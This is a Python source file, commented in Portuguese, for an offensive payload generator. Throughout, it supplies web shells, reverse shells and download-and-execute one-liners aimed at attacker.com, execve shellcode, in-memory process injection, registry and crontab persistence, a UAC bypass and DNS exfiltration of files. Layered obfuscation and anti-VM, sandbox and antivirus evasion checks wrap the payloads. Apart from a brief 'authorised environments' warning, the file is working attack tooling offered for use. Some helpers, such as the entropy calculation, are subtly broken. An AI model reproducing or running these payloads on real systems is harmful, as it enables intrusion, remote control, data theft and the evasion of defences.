#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 ADVANCED PAYLOADS MODULE 🎯
Payloads avançados polimórficos e anti-detecção
Implementa técnicas de última geração para bypass de defesas

⚠️  ATENÇÃO: EXTREMAMENTE PERIGOSO - USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import random
import string
import base64
import hashlib
import zlib
import struct
import time
import json
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
import binascii

@dataclass
class PayloadTemplate:
    """Template de payload"""
    name: str
    category: str
    language: str
    base_payload: str
    variables: List[str]
    evasion_techniques: List[str]
    target_platforms: List[str]
    detection_score: float  # 0.0 = fácil detecção, 1.0 = difícil

@dataclass
class GeneratedPayload:
    """Payload gerado"""
    payload_id: str
    original_template: str
    generated_code: str
    encoding_used: str
    obfuscation_level: str
    size_bytes: int
    entropy_score: float
    av_evasion_score: float
    target_platform: str

class AdvancedPayloads:
    """
    🎯 Engine de payloads avançados
    
    Técnicas implementadas:
    - Payloads polimórficos
    - Encoding/obfuscation multicamada
    - Anti-VM/sandbox detection
    - Metamorphic code generation
    - Steganografia em payloads
    - Living off the land payloads
    - Fileless execution techniques
    - Process injection payloads
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        
        # Templates de payloads por categoria
        self.payload_templates = {
            "web_shells": self._initialize_web_shell_templates(),
            "reverse_shells": self._initialize_reverse_shell_templates(),
            "persistence": self._initialize_persistence_templates(),
            "privilege_escalation": self._initialize_privesc_templates(),
            "data_exfiltration": self._initialize_exfil_templates(),
            "living_off_land": self._initialize_lol_templates(),
            "fileless": self._initialize_fileless_templates()
        }
        
        # Técnicas de encoding/obfuscation
        self.encoding_techniques = {
            "base64": self._encode_base64,
            "hex": self._encode_hex,
            "url": self._encode_url,
            "html_entities": self._encode_html_entities,
            "unicode": self._encode_unicode,
            "gzip": self._encode_gzip,
            "xor": self._encode_xor,
            "rot13": self._encode_rot13,
            "custom_cipher": self._encode_custom_cipher
        }
        
        # Técnicas de obfuscação por linguagem
        self.obfuscation_techniques = {
            "javascript": self._obfuscate_javascript,
            "powershell": self._obfuscate_powershell,
            "bash": self._obfuscate_bash,
            "python": self._obfuscate_python,
            "php": self._obfuscate_php,
            "vbscript": self._obfuscate_vbscript
        }
        
        # Anti-detecção
        self.anti_detection = {
            "vm_detection": self._add_vm_detection,
            "sandbox_evasion": self._add_sandbox_evasion,
            "av_evasion": self._add_av_evasion,
            "delay_execution": self._add_delay_execution,
            "environment_checks": self._add_environment_checks
        }

    def generate_polymorphic_payload(self, template_name: str, target_platform: str, 
                                   obfuscation_level: str = "high") -> GeneratedPayload:
        """
        🎯 Gera payload polimórfico
        """
        if self.logger:
            self.logger.info(f"🎯 Gerando payload polimórfico: {template_name}")
        
        # Encontrar template
        template = self._find_template(template_name)
        if not template:
            raise ValueError(f"Template {template_name} não encontrado")
        
        # Gerar variações únicas
        base_payload = template.base_payload
        
        # 1. Substituir variáveis
        payload = self._substitute_variables(base_payload, template.variables)
        
        # 2. Aplicar obfuscação
        payload = self._apply_obfuscation(payload, template.language, obfuscation_level)
        
        # 3. Adicionar anti-detecção
        payload = self._add_anti_detection_techniques(payload, template.language)
        
        # 4. Encoding final
        encoding_method = random.choice(list(self.encoding_techniques.keys()))
        encoded_payload = self.encoding_techniques[encoding_method](payload)
        
        # 5. Calcular métricas
        payload_id = hashlib.md5(encoded_payload.encode()).hexdigest()[:8]
        entropy = self._calculate_entropy(encoded_payload)
        av_score = self._calculate_av_evasion_score(encoded_payload, template)
        
        result = GeneratedPayload(
            payload_id=payload_id,
            original_template=template_name,
            generated_code=encoded_payload,
            encoding_used=encoding_method,
            obfuscation_level=obfuscation_level,
            size_bytes=len(encoded_payload),
            entropy_score=entropy,
            av_evasion_score=av_score,
            target_platform=target_platform
        )
        
        if self.logger:
            self.logger.success(f"🎯 Payload polimórfico gerado: {payload_id}")
        
        return result

    def generate_payload_variants(self, template_name: str, count: int = 5) -> List[GeneratedPayload]:
        """
        🎯 Gera múltiplas variantes de um payload
        """
        if self.logger:
            self.logger.info(f"🎯 Gerando {count} variantes de {template_name}")
        
        variants = []
        
        for i in range(count):
            # Variar parâmetros para cada geração
            platforms = ["windows", "linux", "macos", "web"]
            obfuscation_levels = ["low", "medium", "high", "extreme"]
            
            platform = random.choice(platforms)
            obfuscation = random.choice(obfuscation_levels)
            
            try:
                variant = self.generate_polymorphic_payload(template_name, platform, obfuscation)
                variants.append(variant)
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Erro gerando variante {i}: {e}")
        
        if self.logger:
            self.logger.success(f"🎯 {len(variants)} variantes geradas com sucesso")
        
        return variants

    def generate_metamorphic_shellcode(self, architecture: str = "x64") -> bytes:
        """
        🧬 Gera shellcode metamórfico
        """
        if self.logger:
            self.logger.info(f"🧬 Gerando shellcode metamórfico para {architecture}")
        
        if architecture == "x64":
            # Base shellcode (execve /bin/sh)
            base_shellcode = bytes([
                0x48, 0x31, 0xf6,              # xor rsi, rsi
                0x56,                          # push rsi
                0x48, 0xbf, 0x2f, 0x62, 0x69,  # movabs rdi, 0x68732f6e69622f
                0x6e, 0x2f, 0x2f, 0x73, 0x68,
                0x57,                          # push rdi
                0x54,                          # push rsp
                0x5f,                          # pop rdi
                0x6a, 0x3b,                    # push 0x3b
                0x58,                          # pop rax
                0x99,                          # cdq
                0x0f, 0x05                     # syscall
            ])
        else:  # x86
            base_shellcode = bytes([
                0x31, 0xc0,        # xor eax, eax
                0x50,              # push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,  # push 0x68732f2f
                0x68, 0x2f, 0x62, 0x69, 0x6e,  # push 0x6e69622f
                0x89, 0xe3,        # mov ebx, esp
                0x50,              # push eax
                0x53,              # push ebx
                0x89, 0xe1,        # mov ecx, esp
                0xb0, 0x0b,        # mov al, 0xb
                0xcd, 0x80         # int 0x80
            ])
        
        # Aplicar metamorfismo
        metamorphic_shellcode = self._apply_metamorphic_transforms(base_shellcode)
        
        return metamorphic_shellcode

    def generate_steganographic_payload(self, payload: str, cover_data: str) -> str:
        """
        🖼️ Gera payload usando steganografia
        """
        if self.logger:
            self.logger.info("🖼️ Aplicando steganografia ao payload")
        
        # Converter payload para bits
        payload_bits = ''.join(format(ord(c), '08b') for c in payload)
        
        # Esconder nos LSBs do cover data
        stego_data = ""
        bit_index = 0
        
        for char in cover_data:
            if bit_index < len(payload_bits):
                # Modificar LSB
                char_value = ord(char)
                char_value = (char_value & 0xFE) | int(payload_bits[bit_index])
                stego_data += chr(char_value)
                bit_index += 1
            else:
                stego_data += char
        
        # Adicionar marcador de fim
        stego_data += "\x00END_PAYLOAD\x00"
        
        return stego_data

    def generate_living_off_land_payload(self, technique: str, target_os: str) -> str:
        """
        🏠 Gera payload Living off the Land
        """
        if self.logger:
            self.logger.info(f"🏠 Gerando LoL payload: {technique} para {target_os}")
        
        lol_payloads = {
            "windows": {
                "powershell_download": '''
                $client = New-Object System.Net.WebClient;
                $client.DownloadString('http://attacker.com/payload.ps1') | IEX
                ''',
                "certutil_download": '''
                certutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe
                ''',
                "bitsadmin_download": '''
                bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\temp\\payload.exe
                ''',
                "wmic_execution": '''
                wmic process call create "powershell.exe -enc <base64_payload>"
                ''',
                "regsvr32_bypass": '''
                regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
                '''
            },
            "linux": {
                "curl_download": '''
                curl -s http://attacker.com/payload.sh | bash
                ''',
                "wget_execution": '''
                wget -qO- http://attacker.com/payload.sh | sh
                ''',
                "python_reverse_shell": '''
                python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
                ''',
                "nc_reverse_shell": '''
                nc -e /bin/sh attacker.com 4444
                ''',
                "bash_reverse_shell": '''
                bash -i >& /dev/tcp/attacker.com/4444 0>&1
                '''
            }
        }
        
        if target_os in lol_payloads and technique in lol_payloads[target_os]:
            base_payload = lol_payloads[target_os][technique]
            
            # Obfuscar payload
            obfuscated = self._apply_obfuscation(base_payload, "bash" if target_os == "linux" else "powershell", "high")
            
            return obfuscated
        
        return ""

    def generate_fileless_payload(self, execution_method: str, target_os: str) -> str:
        """
        👻 Gera payload fileless
        """
        if self.logger:
            self.logger.info(f"👻 Gerando payload fileless: {execution_method}")
        
        fileless_templates = {
            "powershell_reflection": '''
            $bytes = [System.Convert]::FromBase64String("{base64_payload}");
            $assembly = [System.Reflection.Assembly]::Load($bytes);
            $assembly.EntryPoint.Invoke($null, $null);
            ''',
            "process_injection": '''
            $code = @"
            [DllImport("kernel32.dll")]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            "@;
            Add-Type -TypeDefinition $code;
            $shellcode = [Convert]::FromBase64String("{base64_shellcode}");
            $ptr = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40);
            [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length);
            [Win32]::CreateThread(0, 0, $ptr, 0, 0, 0);
            ''',
            "registry_storage": '''
            # Store payload in registry
            New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion" -Name "Data" -Value "{base64_payload}";
            # Execute from registry
            $data = Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion" -Name "Data";
            $bytes = [Convert]::FromBase64String($data.Data);
            [System.Text.Encoding]::ASCII.GetString($bytes) | IEX;
            '''
        }
        
        if execution_method in fileless_templates:
            template = fileless_templates[execution_method]
            
            # Gerar payload dummy para demonstração
            dummy_payload = base64.b64encode(b"calc.exe").decode()
            
            # Substituir placeholders
            payload = template.replace("{base64_payload}", dummy_payload)
            payload = payload.replace("{base64_shellcode}", dummy_payload)
            
            return payload
        
        return ""

    # ================================
    # TEMPLATES DE PAYLOADS
    # ================================

    def _initialize_web_shell_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates de web shells"""
        return [
            PayloadTemplate(
                name="php_web_shell",
                category="web_shells",
                language="php",
                base_payload='<?php if(isset($_GET["{var1}"])) { eval($_GET["{var1}"]); } ?>',
                variables=["var1"],
                evasion_techniques=["variable_substitution", "encoding"],
                target_platforms=["web"],
                detection_score=0.3
            ),
            PayloadTemplate(
                name="jsp_web_shell",
                category="web_shells", 
                language="jsp",
                base_payload='<%@ page import="java.io.*" %><% if (request.getParameter("{var1}") != null) { Runtime.getRuntime().exec(request.getParameter("{var1}")); } %>',
                variables=["var1"],
                evasion_techniques=["obfuscation"],
                target_platforms=["web"],
                detection_score=0.4
            ),
            PayloadTemplate(
                name="aspx_web_shell",
                category="web_shells",
                language="aspx",
                base_payload='<%@ Page Language="C#" %><script runat="server">void Page_Load(object sender, EventArgs e) { if (Request["{var1}"] != null) { Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["{var1}"]).StandardOutput.ReadToEnd()); } }</script>',
                variables=["var1"],
                evasion_techniques=["encoding", "compression"],
                target_platforms=["web"],
                detection_score=0.5
            )
        ]

    def _initialize_reverse_shell_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates de reverse shells"""
        return [
            PayloadTemplate(
                name="python_reverse_shell",
                category="reverse_shells",
                language="python",
                base_payload='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',
                variables=["host", "port"],
                evasion_techniques=["encoding", "obfuscation"],
                target_platforms=["linux", "windows"],
                detection_score=0.6
            ),
            PayloadTemplate(
                name="powershell_reverse_shell",
                category="reverse_shells",
                language="powershell",
                base_payload='$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
                variables=["host", "port"],
                evasion_techniques=["encoding", "compression"],
                target_platforms=["windows"],
                detection_score=0.7
            )
        ]

    def _initialize_persistence_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates de persistência"""
        return [
            PayloadTemplate(
                name="windows_registry_persistence",
                category="persistence",
                language="powershell",
                base_payload='New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{name}" -Value "{payload}" -PropertyType String',
                variables=["name", "payload"],
                evasion_techniques=["registry_steganography"],
                target_platforms=["windows"],
                detection_score=0.4
            ),
            PayloadTemplate(
                name="linux_crontab_persistence",
                category="persistence",
                language="bash",
                base_payload='(crontab -l ; echo "{schedule} {payload}") | crontab -',
                variables=["schedule", "payload"],
                evasion_techniques=["encoding"],
                target_platforms=["linux"],
                detection_score=0.5
            )
        ]

    def _initialize_privesc_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates de privilege escalation"""
        return [
            PayloadTemplate(
                name="windows_uac_bypass",
                category="privilege_escalation",
                language="powershell",
                base_payload='New-Object -comObject Shell.Application).ShellExecute("powershell.exe", "-WindowStyle Hidden -Command {payload}", "", "runas", 0)',
                variables=["payload"],
                evasion_techniques=["obfuscation"],
                target_platforms=["windows"],
                detection_score=0.6
            )
        ]

    def _initialize_exfil_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates de exfiltração"""
        return [
            PayloadTemplate(
                name="dns_exfiltration",
                category="data_exfiltration",
                language="powershell",
                base_payload='$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content "{file}")));nslookup "$data.{domain}"',
                variables=["file", "domain"],
                evasion_techniques=["encoding", "chunking"],
                target_platforms=["windows", "linux"],
                detection_score=0.8
            )
        ]

    def _initialize_lol_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates Living off the Land"""
        return [
            PayloadTemplate(
                name="certutil_download",
                category="living_off_land",
                language="cmd",
                base_payload='certutil -urlcache -split -f {url} {output}',
                variables=["url", "output"],
                evasion_techniques=["native_binary"],
                target_platforms=["windows"],
                detection_score=0.7
            )
        ]

    def _initialize_fileless_templates(self) -> List[PayloadTemplate]:
        """Inicializa templates fileless"""
        return [
            PayloadTemplate(
                name="powershell_reflection",
                category="fileless",
                language="powershell",
                base_payload='[System.Reflection.Assembly]::Load([Convert]::FromBase64String("{assembly}")).EntryPoint.Invoke($null, $null)',
                variables=["assembly"],
                evasion_techniques=["in_memory_execution"],
                target_platforms=["windows"],
                detection_score=0.9
            )
        ]

    # ================================
    # FUNÇÕES DE OBFUSCAÇÃO
    # ================================

    def _find_template(self, template_name: str) -> Optional[PayloadTemplate]:
        """Encontra template por nome"""
        for category_templates in self.payload_templates.values():
            for template in category_templates:
                if template.name == template_name:
                    return template
        return None

    def _substitute_variables(self, payload: str, variables: List[str]) -> str:
        """Substitui variáveis no payload"""
        substitutions = {
            "var1": f"param_{random.randint(1000, 9999)}",
            "host": "127.0.0.1",
            "port": str(random.randint(4000, 9000)),
            "name": f"update_{random.randint(100, 999)}",
            "payload": "calc.exe",
            "schedule": "*/5 * * * *",
            "file": "C:\\temp\\data.txt",
            "domain": "attacker.com",
            "url": "http://attacker.com/payload.exe",
            "output": "C:\\temp\\payload.exe",
            "assembly": base64.b64encode(b"dummy_assembly").decode()
        }
        
        result = payload
        for var in variables:
            if var in substitutions:
                result = result.replace(f"{{{var}}}", substitutions[var])
        
        return result

    def _apply_obfuscation(self, payload: str, language: str, level: str) -> str:
        """Aplica obfuscação baseada na linguagem e nível"""
        if language in self.obfuscation_techniques:
            return self.obfuscation_techniques[language](payload, level)
        return payload

    def _obfuscate_javascript(self, payload: str, level: str) -> str:
        """Obfuscação JavaScript"""
        if level == "low":
            # Apenas renomear algumas variáveis
            return payload.replace("var ", f"var _{random.randint(1, 999)}_")
        elif level == "medium":
            # Encoding + renomeação
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval(atob('{encoded}'))"
        elif level == "high":
            # Múltiplas camadas
            encoded = base64.b64encode(payload.encode()).decode()
            obfuscated = f"eval(atob('{encoded}'))"
            # Adicionar dummy code
            return f"var _dummy = Math.random(); {obfuscated}"
        else:  # extreme
            # Metamórfico
            return self._metamorphic_javascript(payload)

    def _obfuscate_powershell(self, payload: str, level: str) -> str:
        """Obfuscação PowerShell"""
        if level == "low":
            return payload.replace("$", f"${''.join(random.choices(string.ascii_letters, k=3))}")
        elif level == "medium":
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        elif level == "high":
            # Compression + encoding
            compressed = zlib.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            return f"[System.Text.Encoding]::UTF8.GetString([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream][System.Convert]::FromBase64String('{encoded}'), [System.IO.Compression.CompressionMode]::Decompress).ReadToEnd()) | IEX"
        else:  # extreme
            return self._metamorphic_powershell(payload)

    def _obfuscate_bash(self, payload: str, level: str) -> str:
        """Obfuscação Bash"""
        if level == "low":
            return payload.replace("echo", "printf")
        elif level == "medium":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo '{encoded}' | base64 -d | bash"
        elif level == "high":
            # Hex encoding
            hex_payload = payload.encode().hex()
            return f"echo '{hex_payload}' | xxd -r -p | bash"
        else:  # extreme
            return self._metamorphic_bash(payload)

    def _obfuscate_python(self, payload: str, level: str) -> str:
        """Obfuscação Python"""
        if level == "low":
            return f"exec('{payload}')"
        elif level == "medium":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"exec(__import__('base64').b64decode('{encoded}').decode())"
        else:
            return self._metamorphic_python(payload)

    def _obfuscate_php(self, payload: str, level: str) -> str:
        """Obfuscação PHP"""
        if level == "low":
            return f"eval('{payload}');"
        else:
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval(base64_decode('{encoded}'));"

    def _obfuscate_vbscript(self, payload: str, level: str) -> str:
        """Obfuscação VBScript"""
        return f"Execute(\"{payload}\")"

    def _metamorphic_javascript(self, payload: str) -> str:
        """JavaScript metamórfico"""
        # Implementação simplificada
        var_names = [f"_{random.randint(1000, 9999)}" for _ in range(5)]
        return f"var {var_names[0]} = '{payload}'; eval({var_names[0]});"

    def _metamorphic_powershell(self, payload: str) -> str:
        """PowerShell metamórfico"""
        var_name = f"${random.choice(string.ascii_letters)}{''.join(random.choices(string.ascii_letters + string.digits, k=8))}"
        return f"{var_name} = '{payload}'; Invoke-Expression {var_name}"

    def _metamorphic_bash(self, payload: str) -> str:
        """Bash metamórfico"""
        var_name = f"_{random.randint(10000, 99999)}"
        return f"{var_name}='{payload}'; eval ${var_name}"

    def _metamorphic_python(self, payload: str) -> str:
        """Python metamórfico"""
        var_name = f"_{random.randint(10000, 99999)}"
        return f"{var_name} = '{payload}'\nexec({var_name})"

    # ================================
    # ENCODING TECHNIQUES
    # ================================

    def _encode_base64(self, payload: str) -> str:
        """Encoding Base64"""
        return base64.b64encode(payload.encode()).decode()

    def _encode_hex(self, payload: str) -> str:
        """Encoding Hexadecimal"""
        return payload.encode().hex()

    def _encode_url(self, payload: str) -> str:
        """Encoding URL"""
        import urllib.parse
        return urllib.parse.quote(payload)

    def _encode_html_entities(self, payload: str) -> str:
        """Encoding HTML Entities"""
        import html
        return html.escape(payload)

    def _encode_unicode(self, payload: str) -> str:
        """Encoding Unicode"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def _encode_gzip(self, payload: str) -> str:
        """Compression GZIP + Base64"""
        compressed = zlib.compress(payload.encode())
        return base64.b64encode(compressed).decode()

    def _encode_xor(self, payload: str) -> str:
        """XOR Encoding"""
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in payload)
        return base64.b64encode(xored.encode('latin-1')).decode() + f"|{key}"

    def _encode_rot13(self, payload: str) -> str:
        """ROT13 Encoding"""
        import codecs
        return codecs.encode(payload, 'rot13')

    def _encode_custom_cipher(self, payload: str) -> str:
        """Cipher customizado"""
        key = random.randint(1, 25)
        result = ""
        for char in payload:
            if char.isalpha():
                shifted = ord(char) + key
                if char.islower() and shifted > ord('z'):
                    shifted -= 26
                elif char.isupper() and shifted > ord('Z'):
                    shifted -= 26
                result += chr(shifted)
            else:
                result += char
        return result + f"|{key}"

    # ================================
    # ANTI-DETECÇÃO
    # ================================

    def _add_anti_detection_techniques(self, payload: str, language: str) -> str:
        """Adiciona técnicas anti-detecção"""
        techniques = random.sample(list(self.anti_detection.keys()), 2)
        
        result = payload
        for technique in techniques:
            result = self.anti_detection[technique](result, language)
        
        return result

    def _add_vm_detection(self, payload: str, language: str) -> str:
        """Adiciona detecção de VM"""
        if language == "powershell":
            vm_check = '''
            $vm_indicators = @("VirtualBox", "VMware", "QEMU", "Xen")
            $wmi_bios = Get-WmiObject -Class Win32_BIOS
            $is_vm = $false
            foreach ($indicator in $vm_indicators) {
                if ($wmi_bios.SerialNumber -like "*$indicator*") { $is_vm = $true }
            }
            if (-not $is_vm) {
            '''
            return vm_check + payload + "\n}"
        elif language == "bash":
            vm_check = '''
            if [ ! -f /proc/version ] || ! grep -qi "virtual\\|vmware\\|qemu" /proc/version; then
            '''
            return vm_check + payload + "\nfi"
        
        return payload

    def _add_sandbox_evasion(self, payload: str, language: str) -> str:
        """Adiciona evasão de sandbox"""
        if language == "powershell":
            sandbox_check = '''
            $processes = Get-Process | Select-Object -ExpandProperty Name
            $sandbox_processes = @("wireshark", "fiddler", "vmtools", "vboxtray")
            $is_sandbox = $false
            foreach ($proc in $sandbox_processes) {
                if ($processes -contains $proc) { $is_sandbox = $true }
            }
            if (-not $is_sandbox) {
            '''
            return sandbox_check + payload + "\n}"
        
        return payload

    def _add_av_evasion(self, payload: str, language: str) -> str:
        """Adiciona evasão de antivírus"""
        if language == "powershell":
            av_check = '''
            $av_processes = @("avp", "avgnt", "mcshield", "windefend")
            $running_processes = Get-Process | Select-Object -ExpandProperty Name
            $av_detected = $false
            foreach ($av in $av_processes) {
                if ($running_processes -contains $av) { $av_detected = $true }
            }
            if (-not $av_detected) {
            '''
            return av_check + payload + "\n}"
        
        return payload

    def _add_delay_execution(self, payload: str, language: str) -> str:
        """Adiciona delay na execução"""
        if language == "powershell":
            delay = f"Start-Sleep -Seconds {random.randint(10, 60)}\n"
            return delay + payload
        elif language == "bash":
            delay = f"sleep {random.randint(5, 30)}\n"
            return delay + payload
        
        return payload

    def _add_environment_checks(self, payload: str, language: str) -> str:
        """Adiciona verificações de ambiente"""
        if language == "powershell":
            env_check = '''
            $domain = (Get-WmiObject -Class Win32_ComputerSystem).Domain
            if ($domain -ne "WORKGROUP") {
            '''
            return env_check + payload + "\n}"
        
        return payload

    # ================================
    # UTILIDADES
    # ================================

    def _apply_metamorphic_transforms(self, shellcode: bytes) -> bytes:
        """Aplica transformações metamórficas ao shellcode"""
        # 1. Inserir NOPs aleatórios
        result = bytearray()
        for byte in shellcode:
            result.append(byte)
            # 20% chance de inserir NOP
            if random.random() < 0.2:
                result.append(0x90)  # NOP
        
        # 2. Reordenar instruções independentes (simplificado)
        # Em implementação real, faria análise de dependências
        
        return bytes(result)

    def _calculate_entropy(self, data: str) -> float:
        """Calcula entropia dos dados"""
        if not data:
            return 0.0
        
        # Contar frequência de cada caractere
        char_counts = {}
        for char in data:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        # Calcular entropia
        entropy = 0.0
        data_len = len(data)
        
        for count in char_counts.values():
            probability = count / data_len
            if probability > 0:
                entropy -= probability * (probability.bit_length() - 1)
        
        return min(1.0, entropy / 8.0)  # Normalizar para 0-1

    def _calculate_av_evasion_score(self, payload: str, template: PayloadTemplate) -> float:
        """Calcula score de evasão de antivírus"""
        base_score = template.detection_score
        
        # Fatores que aumentam evasão
        if len(payload) > 1000:  # Payloads maiores são mais suspeitos
            base_score *= 0.9
        
        if "eval" in payload.lower():  # eval é suspeito
            base_score *= 0.8
        
        if any(technique in template.evasion_techniques for technique in ["encoding", "obfuscation"]):
            base_score *= 1.2
        
        entropy = self._calculate_entropy(payload)
        if entropy > 0.7:  # Alta entropia indica obfuscação
            base_score *= 1.1
        
        return min(1.0, base_score)

    def get_payload_statistics(self, payloads: List[GeneratedPayload]) -> Dict[str, Any]:
        """Retorna estatísticas dos payloads gerados"""
        if not payloads:
            return {}
        
        return {
            "total_payloads": len(payloads),
            "average_size": sum(p.size_bytes for p in payloads) / len(payloads),
            "average_entropy": sum(p.entropy_score for p in payloads) / len(payloads),
            "average_av_evasion": sum(p.av_evasion_score for p in payloads) / len(payloads),
            "encoding_distribution": {
                encoding: len([p for p in payloads if p.encoding_used == encoding])
                for encoding in set(p.encoding_used for p in payloads)
            },
            "platform_distribution": {
                platform: len([p for p in payloads if p.target_platform == platform])
                for platform in set(p.target_platform for p in payloads)
            }
        }